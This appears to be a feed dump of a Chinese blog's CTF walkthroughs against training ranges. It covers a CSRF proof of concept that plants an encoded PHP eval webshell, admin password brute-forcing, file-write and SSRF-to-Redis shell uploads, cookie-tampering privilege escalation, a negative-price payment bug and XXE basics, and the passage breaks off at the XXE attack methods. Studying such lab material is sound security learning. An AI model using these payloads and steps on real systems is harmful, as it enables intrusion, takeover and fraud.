<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">history.pushState(<span class="string">''</span>, <span class="string">''</span>, <span class="string">'/'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">"aa"</span> <span class="attr">action</span>=<span class="string">"http://59.63.200.79:8010/newcsrf/dede/file_manage_control.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"fmdo"</span> <span class="attr">value</span>=<span class="string">"edit"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"backurl"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"activepath"</span> <span class="attr">value</span>=<span class="string">"<span class="symbol">&amp;#47;</span>newcsrf"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"filename"</span> <span class="attr">value</span>=<span class="string">"a<span class="symbol">&amp;#46;</span>php"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"str"</span> <span class="attr">value</span>=<span class="string">"<span class="symbol">&amp;lt;</span><span class="symbol">&amp;#63;</span>php<span class="symbol">&amp;#32;</span>eval<span class="symbol">&amp;#40;</span><span class="symbol">&amp;#36;</span><span class="symbol">&amp;#95;</span>REQUEST<span class="symbol">&amp;#91;</span>1<span class="symbol">&amp;#93;</span><span class="symbol">&amp;#41;</span><span class="symbol">&amp;#59;</span><span class="symbol">&amp;#63;</span><span class="symbol">&amp;gt;</span>"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"B1"</span> <span class="attr">value</span>=<span class="string">"<span class="symbol">&amp;#32;</span><span class="symbol">&amp;#32;</span><span class="symbol">&amp;#177;</span><span class="symbol">&amp;#163;</span><span class="symbol">&amp;#32;</span><span class="symbol">&amp;#180;</span>?<span class="symbol">&amp;#32;</span><span class="symbol">&amp;#32;</span>"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">		<span class="built_in">document</span>.aa.submit();</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><strong>因为我们可能没有公网，所以靶场提供了一个可以上传html的地方，在问题反馈页面</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210818121820266.png" alt="image-20210818121820266"></p>
</blockquote>
<p>上传刚刚我们得到poc，看看是否存在，记得确认是否存在</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210818121848947.png" alt="image-20210818121848947"></p>
</blockquote>
<p><strong>确认好了，就可以上传shell到主页了，问题反馈一下，让机器人访问一下</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210818123847788.png" alt="image-20210818123847788"></p>
</blockquote>
<p><strong>接着我们就可以在我们上传的路径看到shell了</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210818123927992.png" alt="image-20210818123927992"></p>
</blockquote>
<p><strong>下面基操，蚁剑连接，拿flag</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210818124250106.png" alt="image-20210818124250106"></p>
</blockquote>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
        <tag>封神台</tag>
        <tag>CSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>【封神台】漏洞原理到利用 wp</title>
    <url>/posts/105.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li>掌控安全里面的靶场漏洞原理到利用，学习一下！</li>
</ul>
</blockquote>
<h1 id="验证码绕过"><a href="#验证码绕过" class="headerlink" title="验证码绕过"></a>验证码绕过</h1><blockquote>
<p>环境：<a href="http://yzmrg988.zs.aqlab.cn/" target="_blank" rel="noopener">http://yzmrg988.zs.aqlab.cn/</a></p>
</blockquote>
<p>打开环境，cms UsualToolCMS</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210820133939231.png" alt="image-20210820133939231"></p>
</blockquote>
<p>直接去站长源码下载过来</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210820133959220.png" alt="image-20210820133959220"></p>
</blockquote>
<p>可以发现管理员路径/cmsadmin/a_admin.php</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210820134022501.png" alt="image-20210820134022501"></p>
</blockquote>
<p>访问一下，因为说是验证码绕过，估计也是弱密码，直接抓包跑一下top100密码试试</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210820134233568.png" alt="image-20210820134233568"></p>
</blockquote>
<p>直接跑seclist圈的常用密码</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210820134724566.png" alt="image-20210820134724566"></p>
</blockquote>
<p>由于单单靠长度来判别是否成功有点困难，所以匹配grep-Extract提取一下，如果出现不同的字符就说明找到了。</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210820135140610.png" alt="image-20210820135140610"></p>
</blockquote>
<p>找到密码为root</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210820135225950.png" alt="image-20210820135225950"></p>
</blockquote>
<p>去登陆admin、root成功进入后台</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210820135309463.png" alt="image-20210820135309463"></p>
</blockquote>
<p>审计一下代码，先自动审计看看有什么危险函数，结果看到后台a_tampletex.php存在一个文件任意写入的函数，跟进看看</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210820140137694.png" alt="image-20210820140137694"></p>
</blockquote>
<p>主要代码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$x=UsualToolCMS::sqlcheck($_GET[<span class="string">"x"</span>]);</span><br><span class="line"><span class="keyword">if</span>($x==<span class="string">"m"</span>)&#123;</span><br><span class="line">    $filename=$_POST[<span class="string">"filename"</span>];</span><br><span class="line">    $dir=$_POST[<span class="string">"dir"</span>];</span><br><span class="line">    $content=$_POST[<span class="string">"content"</span>];</span><br><span class="line">  $id=UsualToolCMS::sqlcheckx($_POST[<span class="string">"id"</span>]);</span><br><span class="line">    $tp=$_POST[<span class="string">"tp"</span>];</span><br><span class="line">    $contents=iconv(<span class="string">"utf-8"</span>,<span class="string">"utf-8"</span>,$content);</span><br><span class="line">    $filenames=<span class="string">"../"</span>.$dir.<span class="string">"/"</span>.$filename.<span class="string">"."</span>;</span><br><span class="line">    file_put_contents($filenames,$contents);</span><br></pre></td></tr></table></figure></div>

<p>分析一下</p>
<p>1、第一个参数filenames由post传参filename控制</p>
<p>2、第二参数contents由post传参content限制</p>
<p>3、得满足get传参x=m</p>
<p>4、由于filenames的目录会回退一个../所以最后shell会生成在网站页面</p>
<p>准备去写shell <a href="http://yzmrg988.zs.aqlab.cn/cmsadmin/a_templetex.php抓包" target="_blank" rel="noopener">http://yzmrg988.zs.aqlab.cn/cmsadmin/a_templetex.php抓包</a></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210820141713081.png" alt="image-20210820141713081"></p>
</blockquote>
<p>接着访问<a href="http://yzmrg988.zs.aqlab.cn/shell.php" target="_blank" rel="noopener">http://yzmrg988.zs.aqlab.cn/shell.php</a> </p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210820141731029.png" alt="image-20210820141731029"></p>
</blockquote>
<p>蚁剑连接成功拿shell</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210820141839250.png" alt="image-20210820141839250"></p>
</blockquote>
<h1 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="越权漏洞"></a>越权漏洞</h1><p>核心：传参，修改传参中有可能代表你身份的信息<br>水平越权：攻击者可以访问相同权限的不同用户的资源<br>垂直越权：攻击者可以访问高权限用户的资源</p>
<blockquote>
<p>练习环境：<a href="http://59.63.200.79:8002/d/index.asp" target="_blank" rel="noopener">http://59.63.200.79:8002/d/index.asp</a></p>
</blockquote>
<h3 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h3><p>练习一下，先注册两个号<strong>test1和test2</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210820084828368.png" alt="image-20210820084828368"></p>
</blockquote>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210820084823494.png" alt="image-20210820084823494"></p>
</blockquote>
<p>接着查看一下cookie对比一下，发现有些可疑的传参可疑试试</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210820084945708.png" alt="image-20210820084945708"></p>
</blockquote>
<p>登陆test1可疑知道test1的UserID为29，将test2的UserID改为29试试看，发现可以通过test2改UserID来查看test1的资料，并且还可以修改</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210820085051865.png" alt="image-20210820085051865"></p>
</blockquote>
<h3 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h3><p>根据上面的我们还得到有个admin和shenfen两个传参，修改一下试试</p>
<p>将shenfen=3，发现变成维修人员了</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210820085242788.png" alt="image-20210820085242788"></p>
</blockquote>
<p>将shenfen=1，变成管理人员了，明显垂直越权</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210820085332666.png" alt="image-20210820085332666"></p>
</blockquote>
<p>但是访问管理员后台，会被拦截    </p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210820085430963.png" alt="image-20210820085430963"></p>
</blockquote>
<p>在仔细看看传参，发现有个admin=0，将其改为admin=1</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210820085500586.png" alt="image-20210820085500586"></p>
</blockquote>
<p>结果成功进入后台了</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210820085537414.png" alt="image-20210820085537414"></p>
</blockquote>
<p>接着测测有没有未授权访问， 直接复制管理员登陆后的地址，直接访问</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210820085806771.png" alt="image-20210820085806771"></p>
</blockquote>
<p>发现弹了个前端的弹框，关掉javascript的功能看看能不能绕过</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210820085833894.png" alt="image-20210820085833894"></p>
</blockquote>
<p>发现可以访问，但是无法进行操作只能获取信息</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210820085910515.png" alt="image-20210820085910515"></p>
</blockquote>
<p>了解一下</p>
<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>利用方式为使用dict协议操作Redis、file协议读文件、gopher协议反弹Shell等。</p>
<h4 id="ssrf漏洞的原理"><a href="#ssrf漏洞的原理" class="headerlink" title="ssrf漏洞的原理"></a><strong>ssrf漏洞的原理</strong></h4><p>SSRF（服务器端请求伪造），是攻击者构造请求再由服务端发起的漏洞。漏洞点一般在控制服务端发起请求的功能点，涉及的危险函数为file_get_contents、fsockopen、curl_exec。利用SSRF可以对内网发起攻击、对本机未对外开放服务发起攻击、做为攻击跳板。</p>
<h4 id="ssrf有什么作用"><a href="#ssrf有什么作用" class="headerlink" title="ssrf有什么作用"></a>ssrf有什么作用</h4><p>一般用于探测内网端口及信息，查看文件，甚至可以getshell攻击内外网的web应用。</p>
<h4 id="ssrf一般存在于哪些地方："><a href="#ssrf一般存在于哪些地方：" class="headerlink" title="ssrf一般存在于哪些地方："></a><strong>ssrf一般存在于哪些地方：</strong></h4><p>能够对外发起网络请求的地方，可能存在ssrf从远程服务器请求资源处。</p>
<h4 id="如何判断是否有ssrf："><a href="#如何判断是否有ssrf：" class="headerlink" title="如何判断是否有ssrf："></a><strong>如何判断是否有ssrf：</strong></h4><p>从远程服务器请求资源，验证请求是不是由服务器发出</p>
<h4 id="ssrf支持哪些协议："><a href="#ssrf支持哪些协议：" class="headerlink" title="ssrf支持哪些协议："></a><strong>ssrf支持哪些协议：</strong></h4><p><strong>Dict:// file:// sftp:// ldap:// gopher:// ftp:// http:// 等.</strong></p>
<h4 id="SSRF如何绕过"><a href="#SSRF如何绕过" class="headerlink" title="SSRF如何绕过"></a><strong>SSRF如何绕过</strong></h4><p>统一错误信息；限制请求的端口；过滤返回的信息；黑名单内网ip；禁用其他协议，允许http,https。</p>
<h4 id="ssrf里的dict协议的作用"><a href="#ssrf里的dict协议的作用" class="headerlink" title="ssrf里的dict协议的作用"></a><strong>ssrf里的dict协议的作用</strong></h4><p>查看端口，版本信息这些；向服务器端口请求curl命令</p>
<h4 id="ssrf里的file协议的作用"><a href="#ssrf里的file协议的作用" class="headerlink" title="ssrf里的file协议的作用"></a><strong>ssrf里的file协议的作用</strong></h4><p>可以在文件系统中读取文件，有的时候会被禁用</p>
<h4 id="SSRF里的gopher协议的作用"><a href="#SSRF里的gopher协议的作用" class="headerlink" title="SSRF里的gopher协议的作用"></a><strong>SSRF里的gopher协议的作用</strong></h4><p>可以用这个协议发送各种格式的请求包</p>
<h4 id="SSRF的危害："><a href="#SSRF的危害：" class="headerlink" title="SSRF的危害："></a><strong>SSRF的危害：</strong></h4><p>主要还是攻击内网或者本机应用，例如内网存在弱密码或者是某些问题cms就可以通杀了，然后本机应用，有些易受攻击的应用并不会开放端口，但是默认本机运行开放，例如redis，还可以读取本机文件，有些敏感文件，例如数据库配置文件</p>
<h4 id="SSRF漏洞的核心："><a href="#SSRF漏洞的核心：" class="headerlink" title="SSRF漏洞的核心："></a><strong>SSRF漏洞的核心：</strong></h4><p>第一点：进入了内网，绕过了很多防火墙机制，因为防御大部分对外不对内<br>第二点：可以去访问存在漏洞机器上面的内部开放端口。可以触发漏洞（redis之类的）<br>第三点：可以通过file协议读取敏感信息</p>
<h4 id="SSRF挖掘重点："><a href="#SSRF挖掘重点：" class="headerlink" title="SSRF挖掘重点："></a><strong>SSRF挖掘重点：</strong></h4><p>其实不一定非要去找传参名之类的或者功能点，在我看来，如果哪个传参带了协议名或者是带了文件后缀，都可能存在SSRF，一般而言有协议名传参的基本都有，如果是带了文件后缀的，很有可能存在SSRF漏洞或者任意文件下载或者任意文件读取。</p>
<blockquote>
<p>实操环境：<a href="http://59.63.200.79:8019/" target="_blank" rel="noopener">http://59.63.200.79:8019/</a></p>
</blockquote>
<p>通过可以访问本机http地址，存在SSRF漏洞</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210818155317673.png" alt="image-20210818155317673"></p>
</blockquote>
<p><strong>dict协议扫一波端口，线程50,端口1-65535</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210818155447097.png" alt="image-20210818155447097"></p>
</blockquote>
<p>发现了6379端口，该端口的服务是redis，可以利用gopher协议操作redis写入一句话木马，可以选反弹shell或是写入shell,写入shell一般需要知道绝对路径，但这里好像是个例外，可以直接拿<a href="https://github.com/tarunkant/Gopherus" target="_blank" rel="noopener">gopherus.py</a>工具直接拿shell</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210818161453919.png" alt="image-20210818161453919"></p>
</blockquote>
<p><strong>接着将我们得到的payload直接访问，就可以生成shell.php在当前目录中</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210818161520584.png" alt="image-20210818161520584"></p>
</blockquote>
<p><strong>当上面的刷新图标在转圈的时候，说明shell生成ok了，直接访问</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210818161609023.png" alt="image-20210818161609023"></p>
</blockquote>
<p><strong>蚁剑连接成功，是台linux机子</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210818161711917.png" alt="image-20210818161711917"></p>
</blockquote>
<h1 id="支付漏洞"><a href="#支付漏洞" class="headerlink" title="支付漏洞"></a>支付漏洞</h1><blockquote>
<p>环境：<a href="http://zfld588b.zs.aqlab.cn/" target="_blank" rel="noopener">http://zfld588b.zs.aqlab.cn/</a></p>
</blockquote>
<p>理解支付漏洞首先要了解网站支付逻辑，商户网站接入支付结果有两种方式，一种是通过浏览器进行跳转通知，一种是服务器端异步通知。</p>
<p>常见的支付漏洞有这么几种：修改支付价格、修改支付状态、修改购买数量、修改附属值、修改支付接口、多重替换支付、重复支付、最小额支付、值为最大值支付问题、越权支付、无限制试用、修改优惠价</p>
<p><strong>实操：</strong></p>
<p>1、注册一个账号，发现购买点卡的时候抓包，修改为负值会自动增加金额</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210820144217752.png" alt="image-20210820144217752"></p>
</blockquote>
<p>金额就增加了</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210820144231981.png" alt="image-20210820144231981"></p>
</blockquote>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
        <tag>封神台</tag>
        <tag>SSRF</tag>
        <tag>验证码绕过</tag>
        <tag>越权</tag>
        <tag>支付漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>【封神台】漏洞挖掘XXE wp</title>
    <url>/posts/102.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li>掌控安全里面的靶场漏洞挖掘XXE实体注入，学习一下！</li>
</ul>
</blockquote>
<p><strong>做XXE题目之前我们先了解一下XXE实体注入的原理和利用方法</strong></p>
<h1 id="XXE基础知识"><a href="#XXE基础知识" class="headerlink" title="XXE基础知识"></a>XXE基础知识</h1><blockquote>
<p>XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素</p>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210819141610681.png" alt="image-20210819141610681"></p>
<p>所有的 XML 文档（以及 HTML 文档）均由以下简单的构建模块构成：元素、属性、实体、PCDATA、CDATA，由于网上太多介绍就不详细说了</p>
<h2 id="DTD-文档类型定义"><a href="#DTD-文档类型定义" class="headerlink" title="DTD(文档类型定义)"></a>DTD(文档类型定义)</h2><p>DTD（document type defined）的作用是定义 XML 文档的合法构建模块。</p>
<p>DTD 可以在 XML 文档内声明，也可以外部引用。</p>
<p>而DTD的外部实体引用正是XXE漏洞诱因</p>
<p>首先写一个测试xml的文档的php代码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$test=$_POST[<span class="string">'xml'</span>];</span><br><span class="line">$obj = simplexml_load_string($test,<span class="string">'SimpleXMLElement'</span>,LIBXML_NOENT);</span><br><span class="line">print_r($obj);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h4 id="1、内部声明"><a href="#1、内部声明" class="headerlink" title="1、内部声明"></a><strong>1、内部声明</strong></h4><p>完整实例</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span> (<span class="meta-keyword">to</span>,<span class="meta-keyword">from</span>,<span class="meta-keyword">heading</span>,<span class="meta-keyword">body</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span>      (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">from</span>    (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">heading</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">body</span>    (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don't forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>将我们刚刚的php代码利用burp抓包post传入内部声明形式输出看看，注意：要url编码一下，不然&amp;无法被解析而报错</p>
<p>如下内部声明输出结果</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210819142339515.png" alt="image-20210819142339515"></p>
</blockquote>
<h4 id="2、外部声明"><a href="#2、外部声明" class="headerlink" title="2、外部声明"></a>2、外部声明</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"note.dtd"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don't forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210819142549954.png" alt="image-20210819142549954"></p>
</blockquote>
<p>同样编码一下，正常输出</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210819142611233.png" alt="image-20210819142611233"></p>
</blockquote>
<p>由此，我们了解了基本的DTD内部和外部声明的使用</p>
<h2 id="DTD实体"><a href="#DTD实体" class="headerlink" title="DTD实体"></a>DTD实体</h2><blockquote>
<p>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。</p>
</blockquote>
<p>实体又分为一般实体和参数实体<br>1，一般实体的声明语法:<br>引用实体的方式：&amp;实体名；<br>2，参数实体只能在DTD中使用，参数实体的声明格式：<br>引用实体的方式：%实体名；</p>
<h4 id="1、内部实体声明："><a href="#1、内部实体声明：" class="headerlink" title="1、内部实体声明："></a>1、内部实体声明：</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">writer</span> <span class="meta-string">"Bill Gates"</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">copyright</span> <span class="meta-string">"Copyright W3School.com.cn"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span><span class="symbol">&amp;writer;</span><span class="symbol">&amp;copyright;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>post传进去看看输出结果，同样正常输出</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210819142830986.png" alt="image-20210819142830986"></p>
</blockquote>
<h4 id="2、外部实体声明"><a href="#2、外部实体声明" class="headerlink" title="2、外部实体声明"></a>2、外部实体声明</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY writer SYSTEM &quot;http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;dtd&#x2F;entities.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright SYSTEM &quot;http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;dtd&#x2F;entities.dtd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;&#x2F;author&gt;</span><br></pre></td></tr></table></figure></div>

<p>在了解了基础知识后，下面开始了解xml外部实体注入引发的问题。</p>
<h1 id="XXE的攻击方法"><a href="#XXE的攻击方法" class="headerlink" title="XXE的攻击方法"></a>XXE的攻击方法</h1><p>方法一：直接通过DTD外部实体声明</p>
